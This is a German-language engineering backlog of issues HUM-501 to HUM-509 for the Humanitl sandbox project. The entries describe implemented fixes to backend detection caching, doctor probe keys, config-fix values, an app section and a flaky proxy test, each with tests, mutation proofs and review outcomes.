**Start.** Die Obergrenzen aus dem Host stehen in `humanitl_config::resources_within_host` mit dem nun öffentlichen `HostResources` (Wortlaut, Code `CONFIG_003` und Vorschlag `ChangeSetting` mit dem größten Wert des Hosts unverändert). Der Plan der Container-Engine und der Plan der Kernel-Stufe rufen sie als erstes, nur für gesetzte Werte; abgeleitete Werte liegen nie über dem Host. Die Container-Engine hält dafür die gesetzten Werte neben den abgeleiteten (`Settings::configured`) und liest den Host über `HostResources::probe` statt einer eigenen Kopie des Lesens von `/proc/meminfo`.

**Tests.** config: Werte über jedem Host laden unter jedem Backend; `resources_within_host` nennt Schlüssel, Grund und Vorschlag. sandbox: Der Plan beider Backends lehnt Werte über diesem Host mit `CONFIG_003` ab, bevor er etwas prüft oder anlegt; gegen den Host geprüft wird nur, was gesetzt ist. ipc: Mit Werten über jedem Host in beiden Gruppen plant ein Start mit dem Backend des Systems ohne `CONFIG_003`; der Start mit der Engine (HUM-448) lehnt jetzt im Plan ab und läuft nie. Mutationsbeweise: die Obergrenzen wieder beim Laden machen den config- und den ipc-Test rot, ohne die Prüfung im Plan werden beide Plan-Tests rot.

**Offen.** `humanitl doctor` warnt ohne `--probe` nicht vor einem Wert über diesem Host; mit `--probe` scheitert der Probestart des Backends mit dem Befund. Eine eigene Zeile im Doctor wäre ein neuer `BackendCheckId` samt Oberfläche, also ein eigenes Issue.

Review: kein blocking oder major. Kandidaten, aufgenommen in die Folge-Issues:
`humanitl doctor --probe` nimmt einen gespeicherten erfolgreichen Probestart,
bevor der Plan die Werte gegen den Rechner prüft (gehört zum Schlüssel des
Zwischenspeichers, HUM-506); die Backend-Liste meldet ein Backend als
verfügbar, dessen Werte über dem Rechner liegen (gehört zur Liste, HUM-502);
die Vorschau zeigt die zu großen Werte, abgelehnt wird erst der Plan.


---

## HUM-502 · doctor und Backend-Liste: schnell genug für die Frist der App

### Kontext
Aus dem Ultra-Review. `Doctor` und `SandboxBackends` suchen bei jedem Aufruf jedes Backend neu (Podman: Unit-Probe, `podman version`, `podman info`, je bis 30 s; qemu: bis zu fünf Hilfe-Abfragen, je bis 5 s), nacheinander und ohne Zwischenspeicher; die App ruft beide mit 5 s Frist.

### Spezifikation
1. Die Suche läuft parallel je Backend, mit kurzem Zwischenspeicher (etwa bis eine Programmdatei sich ändert); der Server antwortet in der Frist der App, ein langsames Backend erscheint als „wird geprüft" statt die ganze Antwort zu kippen.

### Tests
- Test mit einem Programm, das 10 s braucht: die Antwort kommt unter 5 s, die anderen Backends sind vollständig.

### Akzeptanzkriterien
1. Ein langsames Backend kippt weder doctor noch die Backend-Liste der App.

### Stand nach der Umsetzung (2026-11-15)

**Suche.** Neu ist `humanitl_sandbox::backend_search`: Jedes Backend sucht in einem eigenen Thread, höchstens eine Suche je Backend und Eingabe läuft (wer währenddessen fragt, wartet auf dieselbe), und ein Ergebnis gilt 30 s (`SEARCH_TTL`), solange sich keine Datei geändert hat, von der die Suche abhängt. Welche das sind, sagen die Adapter (`search_files`): je Programm der gesetzte Pfad oder jeder Ort im `PATH`, dazu unter der Container-Engine die Programme des Dienstverwalters, `newuidmap`, `newgidmap` und die Listen der untergeordneten IDs, unter der Kernel-Stufe `/dev/kvm`, Kernel-Abbild samt Konfiguration und Module. Der Abdruck je Datei ist Pfad, Gerät, Inode, Größe, `mtime` und `ctime`; ein Programm, das neu auftaucht, zählt als Änderung. Der Schlüssel enthält die Teile der Gruppe `sandbox`, die eine Suche liest, und die Umgebung des Daemons, nicht Backend, Untergrenze, Profil und die Umgebung der Sandbox. `Doctor` und `SandboxBackends` teilen sich über `BackendSearches` im Daemon dieselbe Suche vor jedem Start; der Doctor merkt sich zusätzlich die Zeilen je Voraussetzung. Untergrenze, Zulassung, Profil und Obergrenzen prüft jede Antwort neu. Eine Suche, die mit einer Panik abbricht, hält niemanden auf und wird bei der nächsten Frage wiederholt.

**Frist je Aufrufer.** Die Frist ist die, die der Aufrufer seinem Aufruf ohnehin gibt: der Kopf `grpc-timeout` (`ipc::deadline`). Die App sendet ihn mit ihren 5 s immer; die Suche bekommt davon die Frist minus 1,5 s, mindestens die Hälfte (3,5 s). Die Kommandozeile setzt keine Frist im Kopf und bekommt das ganze Ergebnis; `humanitl doctor` behält seine eigene Frist von 10 s (120 s mit `--probe`). Ein Feld in der Anfrage wäre eine zweite Angabe derselben Sache gewesen, die von der Frist abweichen kann, nach der tonic die Antwort ohnehin verwirft; der Vertrag bleibt unverändert. Im Doctor laufen die Zeilen der Maschine neben der Suche der Backends.

**„Wird geprüft".** Ohne Änderung der Proto: In der Liste steht ein Backend, dessen Suche noch läuft, als nicht verfügbar mit `DOCTOR_012` als Warnung („still being checked…", Vorschlag `humanitl sandbox backends`), unter der Engine auch ihre Laufzeit. Im Doctor besteht seine Gruppe aus `admitted` und der Zeile `available` ohne Messung (`warn`, `DOCTOR_012`, Vorschlag `humanitl doctor`), auch unter dem gewählten Backend nie `fail`. Die übrigen Backends sind vollständig.

**Obergrenzen in der Liste (Review-Notiz HUM-501).** Die Liste nennt Werte von `sandbox.podman` und `sandbox.qemu` über diesem Rechner als `CONFIG_003` im Eintrag des Backends, mit derselben Prüfung wie der Plan (`beyond_host` je Adapter).

**App.** `SandboxBackendInfo.checking` und `SandboxBackendList.checking` lesen `DOCTOR_012` als Grund; die Zeile unter dem Backend sagt „Still being checked …" / „Wird noch geprüft …" (ARB `sandboxBackendChecking`) statt eines Grundes, das Backend ist noch nicht wählbar, eine bestehende Wahl bleibt aber stehen. Die Liste fragt nach 2 s von selbst wieder, ebenso der Doctor des Setup-Bildschirms, dieser leise ohne Ladezustand. Neues Golden `settings_sandbox_backend_checking`.

**Tests.** sandbox: Gedächtnis (langsame Suche bei der Frist offen und schnelle fertig; ohne Frist gewartet; gehalten bis eine Datei sich ändert oder ein Programm auftaucht; Lebensdauer; laufende Suche geteilt; Panik; Schlüssel ohne Variablen der Sandbox), Liste mit zählendem Programm (zweite Liste startet nichts, geändertes Programm wird neu gesucht), langsame Engine (10 s) in Liste und Doctor mit 1 s Frist unter 4 s und alle anderen vollständig, `CONFIG_003` je Backend in der Liste. ipc: Lesen von `grpc-timeout`; über den echten Socket mit 5 s Frist antworten `Doctor` und `SandboxBackends` unter 5 s, obwohl jedes Programm mit dem Namen eines Backends 10 s schläft, mit mindestens einem Backend „wird geprüft" und den übrigen vollständig. App: Zeile „wird geprüft" und neues Fragen, Wahl bleibt stehen, Doctor fragt wieder. Mutationsbeweise: Suche im Aufrufer statt im Thread (sandbox-Tests der langsamen Suche rot), Abdruck ignoriert oder Gedächtnis aus (Gedächtnis- und Listen-Tests rot), Obergrenzen aus der Liste genommen (beide `CONFIG_003`-Tests rot), Frist aus dem Kopf ignoriert (ipc-Test rot mit `DeadlineExceeded`), App ohne neues Fragen oder ohne `checking` (App-Tests rot).

**Nach dem Review.** Je Schlüssel läuft höchstens eine Suche: Ändert sich eine Datei, während sie läuft, gilt ihr Ergebnis als veraltet und wird nicht wiederverwendet, und die neue Suche startet erst nach ihrem Ende; bis dahin heißt die Antwort „wird geprüft". Lässt sich kein Thread starten, endet die Suche im Gedächtnis ohne Ergebnis wie nach einer Panik (wer wartet, kehrt zurück, die nächste Frage sucht neu); nur der Aufrufer ohne Frist führt sie dann auf seinem Thread außerhalb des Gedächtnisses aus, einer mit Frist bekommt „wird geprüft“. Eine Suche des Doctors, deren Suche vor jedem Start ohne Ergebnis abbrach, wird nicht gemerkt, sondern bleibt „wird geprüft". `doctor --probe` verwirft die gemerkte Suche und sucht neu; „Check again" der App nicht, denn `DoctorRequest` hat kein Feld dafür (Datei-Abdruck und 30 s gelten dort). Der Abdruck der Engine enthält `/usr/bin/newuidmap` und `/usr/bin/newgidmap`. App: `checking` sieht `DOCTOR_012` unter allen Befunden (die Liste fragt weiter, auch wenn ein anderer Grund vorne steht), `undecided` nur, wenn die Prüfung der einzige Grund ist (Anzeige und Wahl). Der Setup-Bildschirm fragt höchstens 15 Mal (30 s), wiederholt einen Fehlschlag innerhalb dieser Grenze, zeigt den Fehler, wenn auch der letzte scheitert, und eine ältere Antwort überschreibt nie die eines späteren „Check again", auch nicht die erste Frage des Bildschirms: Wird sie von „Check again" überholt, endet sie mit dessen Ergebnis, Bericht oder Fehler, nie mit ihrem eigenen. Tests und Mutationsbeweise dazu: eine hängende Suche mit sich ändernder Datei und fünf Fragen startet eine Suche (rot, wenn eine geänderte Datei die laufende ersetzt), scheitert der Start eines Threads, kehrt ein zweiter Wartender zurück, ohne dass eine zweite Suche startet, und nur der Aufrufer ohne Frist bekommt ein Ergebnis (rot ohne `Lost` und `notify_all`), der Probestart sucht neu (rot ohne das Verwerfen), App: Grenze, Fehler, Generation in `refresh` und in der ersten Frage, `checking` (je rot ohne).

**Hingenommener Rest.** Scheitert der Start eines Threads, sucht ein Aufrufer ohne Frist (die Kommandozeile) außerhalb des Gedächtnisses, und die nächste Frage kann daneben eine neue Suche im Gedächtnis starten. Das braucht erschöpfte Threads, betrifft nur die Kommandozeile und ist auf eine Suche je Aufrufer begrenzt; im Review (Codex, Runde 3) als minor eingestuft und so belassen.

**Offen.** Ein Probestart auf Wunsch (`--probe`) läuft nach der Suche ganz, auch mit Frist; die App ruft ihn nie. Die Liste der App fragt ohne Grenze alle 2 s, solange ein Backend in Prüfung ist; jede Frage schließt sich der laufenden Suche an und kostet keine neue. Abfragen nur, solange jemand zusieht, ginge erst mit einem Signal der Oberfläche; die Grenze von 15 Versuchen hält den Doctor bis dahin klein. Die Kommandozeile wartet unter `humanitl doctor` höchstens 10 s auf den Daemon und rechnet sonst im eigenen Prozess (wie bisher).


---

## HUM-503 · Konfiguration: der Fix für `sandbox.podman.rootfs` ohne Anführungszeichen

### Kontext
Aus dem Ultra-Review. Der Fix für `rootfs = "image"` ohne `sandbox.podman.image` schlägt den Wert `"host"` mit Anführungszeichen vor (`config/src/validate.rs`); wer ihn befolgt, hat wieder `CONFIG_003`.

### Spezifikation
1. Der Wert ist `host`, wie bei jedem anderen `ChangeSetting`-Fix.

### Tests
- Unit: der Fix, angewendet, ergibt eine gültige Konfiguration.

### Akzeptanzkriterien
1. Jeder Fix-Vorschlag ergibt einen gültigen Wert.

### Stand nach der Umsetzung (2026-11-15)
Der Fix heißt jetzt `host` statt `"host"`. Das Review (Sonnet) fand
denselben Fehler in den allgemeinen Fixen: `out_of_range` (`validate.rs`)
und `bad_value` (`load.rs`) schlugen die Vorgabe als Zeile von
`config.toml` vor, eine Zeichenkette also mit Anführungszeichen (etwa
`sandbox.profile = "a/b"`, Fix `"default"`). Neu `Field::default_value`, die
Vorgabe so, wie `humanitl config set` sie nimmt; der Text des Befunds zeigt
weiter die Zeile. Tests `every_change_setting_fix_is_a_value_config_set_takes`
(rootfs, Profilname) und `a_bad_value_proposes_the_default_as_config_set_takes_it`
(unbekanntes Backend) wenden den Fix wie `config set` an (`parse_value`,
`check_value`); Mutation mit der alten Darstellung: beide rot.
Ebenso der Vorschlag für einen vertippten Schlüssel (`unknown_key`,
`sandbox.backendd = "auto"` schlug `"auto"` vor); Test
`a_misspelt_key_proposes_its_value_without_quotes`.

Offen, aus der Delta-Runde von Codex, eine andere Klasse als die
Anführungszeichen, als eigenes Issue: `ChangeSetting`-Fixe, deren Wert
eine Anleitung ist (`remove NAME`, „an empty table, unless …", der
Nameserver im Resolver), leere Werte als Eingabeaufforderung
(`llm.api_key_ref`, `sandbox.work_dir`), verdoppelte Fristen über ihrer
Obergrenze (`proxy/limits.rs`) und ein Fix für einen Schlüssel außerhalb des
Schemas (`out_of_range` für `llm.servers.NAME.…`). Dafür braucht es eine
eigene Art von Fix oder eine Begrenzung; das Kriterium „jeder Fix-Vorschlag
ergibt einen gültigen Wert" gilt hier für die Anführungszeichen.


---

## HUM-504 · App: der Abschnitt der Backends verschwindet nicht beim Wechsel

### Kontext
Aus dem Ultra-Review. Beim Wählen eines Backends ist `sandboxBackendsProvider(session)` ein neues Mitglied ohne Wert, und `backend_section.dart` zeigt `SizedBox.shrink()`, bis der Daemon antwortet.

### Spezifikation
1. Die zuletzt gezeigte Liste bleibt stehen, bis die neue da ist.

### Tests
- Widget-Test: nach dem Wechsel bleibt der Abschnitt sichtbar.

### Akzeptanzkriterien
1. Kein Flackern des Abschnitts beim Wechsel.



### Status
Erledigt. `SandboxBackendSection` merkt sich die zuletzt gezeigte Liste und
zeigt sie, solange die Antwort für ein neu gewähltes Backend unterwegs ist:
gedämpft, mit gesperrten Segmenten und dem neuen Segment schon gewählt; Höhe
und Lage bleiben gleich. Ein Fehler blendet den Abschnitt aus, auch wenn
Riverpod nach einer gescheiterten Auffrischung den alten Wert noch hält; eine
laufende Sitzung verwirft die gemerkte Liste. Widget-Tests für das Laden und
die gescheiterte Auffrischung; vier Mutationen rot.

Review: Codex zwei minor (alte Liste wirkte aktuell und bedienbar; Fehler
nach dem Wert geprüft), beide übernommen. Sonnet als Ersatz für Antigravity
kein blocking oder major; übernommen: die gemerkte Liste endet mit einer
Sitzung. Offen als Kandidat: eine Auffrischung desselben Mitglieds (anderes
Projekt, Konfiguration) behält ihren Wert und zeigt ihn nicht als
ausstehend; die Farbe der Gründe während des Ladens ist nicht eigens
getestet.
---

## HUM-505 · CLI: der Fix von `sandbox image pull` nennt die Referenz

### Kontext
Aus dem Ultra-Review. Ohne Terminal oder mit `--json` schlägt `confirm()` in `cmd/image.rs` `humanitl sandbox image pull --yes` ohne die Referenz vor, die der Nutzer nannte; ebenso der Zweig „nicht ja".

### Spezifikation
1. Beide Befehle des Fixes tragen die genannte Referenz.

### Tests
- CLI-Test: der Fix enthält die Referenz.

### Akzeptanzkriterien
1. Der vorgeschlagene Befehl zieht das Image, das gemeint war.

### Stand nach der Umsetzung (2026-11-15)
`confirm` bekommt den Befehl, der das Ziehen wiederholt (`pull_command`):
mit `--backend`, wenn eines gewählt ist, und der genannten Referenz, beide
als Shell-Wort; ohne Terminal steht `--yes` gleich nach `pull`. Test
`the_fix_repeats_the_reference_and_the_backend`; Mutation mit dem festen
Befehl: rot.


---

## HUM-506 · doctor: der gespeicherte Probestart der Kernel-Stufe veraltet mit ihren Programmen und dem Gastkernel

### Kontext
Aus dem Ultra-Review. `VmBackend::tool_version()` liefert eine leere Zeichenkette; der Schlüssel des gespeicherten Probestarts ändert sich nicht, wenn qemu, virtiofsd oder vhost-device-vsock aktualisiert werden oder `sandbox.qemu.kernel`/`modules` auf etwas anderes zeigen; doctor meldet dann „passed (cached)", während Starts scheitern.

### Spezifikation
1. Der Schlüssel enthält die Fassungen oder Datei-Identitäten (Gerät, Inode, Größe, Zeit) der drei Programme und von Gastkernel und Modulverzeichnis; `--probe` startet immer neu.

### Tests
- Unit: ein anderes Kernel-Abbild oder eine geänderte Programmdatei ergibt einen anderen Schlüssel; Mutationsbeweis.

### Akzeptanzkriterien
1. Kein gespeicherter Probestart überlebt eine Änderung seiner Eingaben.

### Stand nach der Umsetzung (2026-11-15)

**Schlüssel.** `ProbeKey` hat einen sechsten Teil, `inputs`: SHA-256 in Hex über die Einstellungen der Backends in der Gruppe `sandbox` (dieselben Teile, die die Suche liest, `backend_search::searched_settings`, darunter Ressourcen, Gastkernel und Modulverzeichnis), die Pfade samt Umgebung des Daemons (Laufzeitordner, Proxy-Verzeichnis, `PATH`), den temporären Ordner des Probestarts und den Abdruck jeder Datei, von der die Suche des Backends abhängt (`backend::search_files`, je Datei Pfad, Gerät, Inode, Größe, `mtime`, `ctime`, über den `Stamp` aus HUM-502, nun als `backend_search::fingerprint`). Unter der Kernel-Stufe sind das Emulator, Dateidienst, vsock-Gerät, bubblewrap, `/dev/kvm`, Kernel-Abbild samt Konfiguration daneben, Modulverzeichnis und darin `modules.builtin`, `modules.dep` und `modules.order` (`prerequisites::MODULE_LISTS`), je gesetzt oder jeder Ort im `PATH`; unter den anderen Stufen bleibt die Fassung im Schlüssel, und der Abdruck des Programms (und unter der Container-Engine der übrigen Dateien ihrer Suche) kommt dazu. Gehasht, damit die Datei keine Pfade oder Einstellungen trägt.

**`--probe`.** Ein Probestart auf Wunsch liest den Zwischenspeicher nie mehr, er startet immer und schreibt nur einen gelungenen. Ohne `--probe` gilt ein gespeicherter Eintrag nur, wenn die gesetzten Ressourcen der Gruppe auf diesen Rechner passen (`backend::beyond_host`, dieselbe Prüfung wie der Plan, HUM-501); sonst steht keine Zeile `probe` da.

**Tests.** probe_cache: ein anderer Abdruck findet den Eintrag nicht. doctor: `--probe` antwortet mit einem neuen, scheiternden Start statt „(cached)", ohne `--probe` steht der gespeicherte da (nur Linux); ein ersetztes oder neu im `PATH` aufgetauchtes Programm ändert den Abdruck. qemu: anderes Kernel-Abbild, neu geschriebenes Abbild, geänderte Konfiguration daneben, anderes Modulverzeichnis, ersetzter Emulator, neuer Dateidienst im `PATH` und andere Ressourcen ändern den Abdruck; Ressourcen über dem Rechner verwerfen einen gespeicherten Probestart mit gleichem Schlüssel. Mutationsbeweise: Nachsehen vor der Frage nach dem Modus, Abdruck ohne Dateien, Abdruck ohne Einstellungen, Schlüssel ohne `inputs` und Zwischenspeicher ohne Prüfung gegen den Rechner machen je den zugehörigen Test rot.

**Review.** Codex: zwei Befunde, beide übernommen. Die Pfade und die Umgebung fehlten im Abdruck (ein anderer Laufzeitordner ließ den Schlüssel gleich); `modules.builtin` und die übrigen Listen wurden nur über das Verzeichnis erfasst, eine Änderung an Ort und Stelle blieb unbemerkt. Tests dazu: anderer Laufzeitordner, an Ort und Stelle neu geschriebenes `modules.builtin`; beide rot ohne die Änderung. Kleinere Befunde des zweiten Reviews übernommen: Der Test von `--probe` sagt, wenn er ohne Kennung des Rechners übersprungen wird, und prüft den Grund des Scheiterns genau (`SANDBOX_012`, die Attrappe des Programms endet, bevor sie den Shim startet).

**Offen.** Einzelne Moduldateien stehen nicht im Abdruck: Sie zu finden hieße, bei jeder Antwort einige tausend Einträge zu durchlaufen. `depmod` schreibt bei jeder Installation eines Kernel-Pakets `modules.dep` und `modules.order` neu; eine von Hand ersetzte Moduldatei ohne `depmod` fängt nur `--probe`. `VmBackend::tool_version` bleibt leer; die Zeile `available` der Kernel-Stufe nennt weiter nur den Emulator ohne Fassung. Der Schlüssel braucht sie nicht mehr, der Abdruck der Dateien ersetzt sie.

Delta-Review (Codex): beide Befunde geschlossen; neu, als minor hingenommen
und als Kandidat notiert: `doctor-probe.json` speichert den Pfad des
Programms im Klartext in Schlüssel und Beleg (so schon vor HUM-506; ein Pfad
ist kein Geheimnis, kann aber einen privaten Ordner aus dem `PATH` nennen).

---

## HUM-507 · Konfiguration: Fixes von `ChangeSetting`, die `config set` nicht annimmt

### Kontext
Rest aus HUM-503. Der Fix eines `ChangeSetting` soll ein Wert sein, den
`humanitl config set <key> <wert>` so annimmt. Einige Fixes sind aber Prosa
oder eine Aufforderung, ein verdoppelter Timeout kann über der Obergrenze
liegen, und ein Schlüssel außerhalb des Schemas hat keinen Wert, den das
Schema kennt.

### Spezifikation
1. Jeder Fix eines `ChangeSetting` ist ein Wert, den `config set` für diesen
   Schlüssel annimmt; sonst ist er kein `ChangeSetting`, sondern ein Fix in
   Prosa.
2. Vorgeschlagene Werte liegen innerhalb der Grenzen des Schemas.

### Tests
- Ein Test über alle Diagnosen mit `ChangeSetting`: der Wert läuft durch
  die Prüfung von `config set` (wie
  `every_change_setting_fix_is_a_value_config_set_takes`, auf alle Quellen
  ausgedehnt).

### Akzeptanzkriterien
1. Kein `ChangeSetting` mit einem Wert, den `config set` ablehnt.

### Stand nach der Umsetzung (2026-11-19)
Neu in `humanitl_config::value`: `check_setting(key, value)` fährt die
Prüfung von `config set` ohne Datei (Blatt des Schemas unter heutigem
Namen, `parse_value`, `check_value`, dazu die Vorgabe-Konfiguration mit
genau diesem Wert durch `Config::validate`, also auch die Grenzen, die nur
in der Prüfung stehen). Darauf drei Wege für Werte, die erst zur Laufzeit
feststehen: `change_setting` (ein Fix nur, wenn die Prüfung ihn nimmt),
`reset_fix` (Vorgabe oder `-`, nur für ein Blatt des Schemas) und `raised`
(das Doppelte, höchstens der größte Wert, den die Prüfung durchlässt; an
der Obergrenze kein Fix). `DiagnosticBuilder::maybe_fix` hängt einen
optionalen Fix an.

Neue Art von Fix `FixAction::EditSetting { key }` (Protokoll 1.50,
`FixAction.edit_setting`; Dart `FixAction.editSetting`): ein Feld, dessen Wert
nur der Mensch kennt. Sie ersetzt jedes `ChangeSetting` mit leerem Wert
(`LLM_002`, `SANDBOX_006`/`CONFIG_013`, `SANDBOX_042`, `PROXY_017`,
`LLM_001` ohne geltende Adresse) und die Beispielwerte von `PROXY_015`
(`/home/USER/.mitmproxy/…`) und `PROXY_017` ohne Proxy
(`http://127.0.0.1:8080`). Die App öffnet damit dieselbe Ordnerauswahl oder
dasselbe Feld wie zuvor (`FixControl`), die Kommandozeile druckt
`humanitl llm key set`, `humanitl egress auth set`, die Wahl des
Projektordners oder `humanitl config set KEY <value>`. Verträglichkeit: Ein
leeres `ChangeSetting` eines Daemons vor 1.50 lesen App (`convert.dart`),
Kommandozeile (`fix_from_proto`) und Aufnahme (`DiagnosticRecord::fix`) als
`EditSetting`. Seither gibt es kein `ChangeSetting` mit leerem Wert mehr.

Umgestellt: `out_of_range` und `bad_value` über `reset_fix` (ein Schlüssel
unter `llm.servers.NAME` bekommt keinen Fix mehr), der Vorschlag zu einem
vertippten oder alten Schlüssel über `change_setting` (der alte Name schlug
eine Zeichenkette noch mit Anführungszeichen vor), die bereinigte
LLM-Adresse, die erste Adapter-Kennung (vier Stellen), das Backend des
Dienstes (`SANDBOX_034`), `LLM_001` mit der geltenden Adresse,
`agent.command` als JSON über `serde_json` statt `format!`. Verdoppelte
Grenzen (`LIMIT_001`, `LIMIT_004`, `PROXY_010`, `PROXY_011`) über
`raised`; `FINDINGS_002` (ohne Abhängigkeit zu `humanitl-config`) bleibt
mit `doubled_cap` unter `i64::MAX`. In Prosa, ohne Fix: `remove NAME` für
eine Linker-Variable, `resolver.nameserver`, `resolver.overrides.HOST`,
`resolver.test_ca` (beide Fälle), `sandbox.env.PATH` bei `AGENT_004` und
`AGENT_006` (die Zeile für `[sandbox.env]` steht im Satz) und die
Kernel-Stufe, wo nur der Mensch den Pfad kennt; ein konfigurierter Kernel,
den es nicht gibt, bekommt `-` (der laufende Kernel). `CONFIG_016` schlägt
`{}` vor. Der Fake (`fake/player.rs`) prüft die Vorschläge einer
Sitzungsdatei beim Lesen mit `check_setting` und kennt `edit_setting`. Die
Fix-Texte in `codes.rs` und `docs/DIAGNOSTICS.md` sind nachgezogen,
`backlog/CONVENTIONS.md` 4.56 hält die Regel fest.

Sperren einer Firmenvorgabe (HUM-534): Der Fix bleibt, auch wenn der
Schlüssel gesperrt ist. Die Erzeuger kennen die Sperren meist nicht, und
`config set` lehnt einen gesperrten Schlüssel mit eigenem Befund ab, der
die Vorgabe nennt; der Vorschlag führt so zu dem Satz, wer ihn verbietet.

Test `every_change_setting_fix_is_a_value_config_set_takes`
(`daemon/crates/config/tests/change_setting_fixes.rs`, Scanner in
`tests/support/scan.rs`): liest den Quelltext aller Crates und Programme,
überspringt Testcode (`#[cfg(test)]`, `#[cfg(all(test, …))]`, deren
Moduldateien samt `#[path]`) und Muster, und prüft jeden Bau eines
`ChangeSetting`: Literale direkt mit `check_setting`, eine Konstante
`…_BACKEND` auf `sandbox.backend` gegen jeden erlaubten Wert, jede andere
Stelle muss mit ihrem Quelltext und ihren möglichen Werten im Register
`SITES` stehen; neue, geänderte und verwaiste Stellen machen ihn rot.
`every_change_setting_the_app_builds_is_a_value_config_set_takes` tut
dasselbe für `FixAction.changeSetting` unter `app/lib/` (`DART_SITES`,
Konstanten von `FormKeys` aufgelöst). Dazu Tests für alle Vorgaben und das
Zurücksetzen jedes Blattes, den ersten Wert jeder Aufzählung, `raised` an
den Grenzen, die Scanner selbst, die Sitzungsdatei des Fakes, die Zeilen
der Kommandozeile und die Verträglichkeit in App, Kommandozeile und
Aufnahme. Mutationen, jeweils rot: `secs.saturating_mul(2).to_string()`
zurück in `proxy/src/limits.rs`, `format!("remove {name}")` zurück in
`validate.rs`, ein Literal `sandbox.env = "remove LD_PRELOAD"` in
`humanitld`, `raised` ohne die Suche nach der Grenze, `doubled_cap` ohne
`min`, `check_fix` aus `check_line` des Fakes entfernt, das leere
`changeSetting` zurück in `client_diagnostics.dart`, `EditSetting` aus
dem Zweig der Ordnerauswahl in `FixControl` entfernt, die Lesart des leeren
`ChangeSetting` aus `convert.dart` entfernt, der Zweig des Projektordners
aus `render.rs`.

Kandidaten für eigene Issues: `config set resolver.test_ca` nimmt jeden
Text, auch einen relativen Pfad oder die frühere Anleitung „an absolute
path, for example …", weil erst der Start des Daemons `CONFIG_012` prüft;
Beispielwerte, die `config set` annimmt, die aber Platzhalter sind
(`https://api.example.com/v1` für `llm.endpoint` in den Befunden des
Agenten und der Probe); die Gegenprobe gegen die wirkliche Datei (etwa
`limits.hold_body_cap_bytes` über einem kleineren `limits.hold_max_bytes`)
kennt nur `config set` selbst.

---

## HUM-508 · doctor: `doctor-probe.json` ohne den Klartextpfad des Programms

### Kontext
Delta-Review von HUM-506. Schlüssel und Beleg eines gespeicherten
Probestarts enthalten den Pfad des Programms im Klartext; so war es schon vor
HUM-506. Ein Pfad ist kein Geheimnis, kann aber einen privaten Ordner aus dem
`PATH` nennen.

### Spezifikation
1. In der Datei steht vom Programm nur ein Hash, im Beleg kein Pfad.

### Tests
- Test liest die geschriebene JSON-Datei und findet den Pfad nicht.

### Akzeptanzkriterien
1. `doctor-probe.json` enthält keinen Pfad aus der Umgebung des Daemons.

### Stand nach der Umsetzung (2026-11-19)

**Schlüssel.** In der Datei steht vom Schlüssel nur noch der SHA-256 seiner
Zeile (`ProbeKey::id`, darin Stufe, Programm, Fassung, Abdruck der Eingaben
aus HUM-506, Fassung von Humanitl und Kennung des Rechners), in Hex
(`probe_cache::key_hash`). Der Vergleich bleibt genau derselbe: Ändert sich
einer der sechs Teile, ändert sich der Hash, und der gespeicherte Probestart
gilt nicht mehr. Die Erkennung eines ersetzten Programms, eines anderen
Gastkernels oder anderer Einstellungen läuft unverändert über den Abdruck aus
HUM-506. Der Helfer `probe_cache::sha256_hex` ersetzt die Hex-Schleife in
`probe_inputs`.

**Beleg.** Ein bestandener Probestart nennt das Backend mit seinem Namen
(`probe_start::passed_label`), nicht mehr mit dem Pfad seines Programms:
„true ran under bwrap; ... hold". Den Pfad zeigt weiter die Zeile
`available`, die nie gespeichert wird.

**Altes Format.** Die Datei trägt ein Feld `format` (jetzt 2). Eine Datei
ohne dieses Feld, also jede von vor HUM-508, zählt als leer: Ihre Einträge
gelten nicht, auch nicht für denselben Schlüssel, und der nächste gelungene
Probestart, auch einer anderen Stufe, schreibt die Datei ohne sie neu. So
bleibt kein alter Eintrag mit Pfad neben einem neuen stehen.

**Tests.** probe_cache: die geschriebene Datei enthält den Ordner des
Programms nicht, wohl aber den Hash, und der Eintrag wird gefunden; eine Datei
im alten Format gilt nicht und ist nach dem nächsten Schreiben ohne ihren
Pfad. backends: Schlüssel und Beleg entstehen wie im Doctor (`probe_key`,
`passed_label`, Urteil über einen bestandenen Start) mit einem Programm in
einem eigenen Ordner unter einem eigenen `HOME`; die gelesene Datei enthält
weder Programm, Ordner, `HOME`, den temporären Ordner noch einen Eintrag des
`PATH` von Test und Rechner. Mutationsbeweise: `key: key.id()` statt des
Hashes in `store` macht sechs Tests rot, darunter beide neuen Prüfungen der
Datei; ohne die Prüfung des Formats in `read` fällt der Test des alten
Formats; der Pfad zurück in `passed_label` macht den Test in backends rot.

---

## HUM-509 · Proxy-Test `the_byte_budget_counts_bodies_while_they_are_buffered` wackelt

### Kontext
CI-Lauf 43763720057 (HUM-506, ohne Änderung am Proxy): `rust-test` rot in
`crates/proxy/tests/limits.rs:1219` mit „readable: Os { code: 104, kind:
ConnectionReset }"; derselbe Inhalt war im nächsten Lauf grün.

### Spezifikation
1. Ursache finden (der Proxy schließt die Verbindung, bevor der Test liest,
   oder der Test erwartet eine Reihenfolge, die nicht garantiert ist), kein
   Wiederholen.

### Akzeptanzkriterien
1. Ursache benannt und behoben; der Test prüft weiter das Budget.

### Status
Erledigt. Ursache: Ist das Budget erschöpft, antwortet der Proxy dem vierten
Client mit `503` und schließt, ohne den Rest des Uploads zu lesen. Liegt
dabei noch Upload ungelesen in seinem Empfangspuffer, meldet Linux dem
Client auf dem Unix-Socket `ECONNRESET`, aber erst nach allen zugestellten
Bytes: Der Abbruch ersetzt das Dateiende, nie die Antwort (gleicher
Mechanismus wie HUM-361). Der Test warf die schon gelesene, vollständige
`503` mit `.expect` weg. Gemessen unter Last: vorher 21 von 2400 Läufen rot,
alle mit ganzer Antwort; nachher 0 von 7200, die ganze Suite `limits` 0 von
1200. Behoben im Test, nicht im Proxy: Ein Leeren des Uploads kostete
Bandbreite für einen Rumpf, den niemand braucht, und der Agent bekommt die
Antwort ohnehin ganz. Der gemeinsame Helfer `read_answer` duldet den
Abbruch nur nach einer Antwort, deren `Content-Length` ganz dasteht (an den
Bytes gezählt), und nur an den Stellen, an denen der Proxy vor dem Rumpf
antwortet; `raw_exchange` und der Fall „200 nach ganzem Rumpf" lesen
streng. Der Doc-Kommentar an `write_refusal` sagt jetzt, was gemessen
wurde. Mutation: ohne die Nachsicht 28 von 2400 rot; mit einem Budget, das
nie greift, rot an „the fourth is refused in time".

Review: Codex und Sonnet als Ersatz für Antigravity kein blocking oder
major; zwei minor übernommen (Länge an den Bytes statt am dekodierten
Text; `raw_exchange` bleibt streng). Offen als Kandidat: die Stelle bei
`limits.rs` um Zeile 1115 hat noch eine eigene Nachsicht und könnte
`read_answer` nutzen.

---

